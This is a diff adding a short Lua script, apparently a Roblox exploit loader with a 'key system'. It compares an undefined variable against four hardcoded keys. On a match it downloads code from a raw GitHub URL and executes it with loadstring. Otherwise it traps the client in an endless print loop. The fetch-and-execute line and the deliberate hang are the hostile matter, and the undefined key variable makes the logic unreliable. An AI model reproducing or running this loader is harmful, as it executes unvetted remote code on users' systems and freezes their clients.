@@ -1,0 +1,25 @@
+local k = {
+    "ahfgug983jg3jugt098u3409tgiu349gikeikt409",
+    "f4u3e89rjf034ik90ggfk9iidfjkldfjg349iu034",
+    "d40gidkfl;kg059iekoprkg5e90ikdoprtk4590ig",
+    "GER895IG90R45KTGRKBFMGLKHFGOPKHFGOKHFgflk"
+}
+
+local x = true
+
+function isKeyValid(key)
+    for _, validKey in ipairs(k) do
+        if key == validKey then
+            return true
+        end
+    end
+    return false
+end
+
+if isKeyValid(e) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PhantomLord157/Nexus/main/NEX"))()
+else
+    while x == true do
+        print("eruigjeriugjert89gujret9jgoihjtuhjtuh9dtjhifjthoipfjh986u598y5874y7t4ugiodjg984utgkdjgh9856u")
+    end
+end
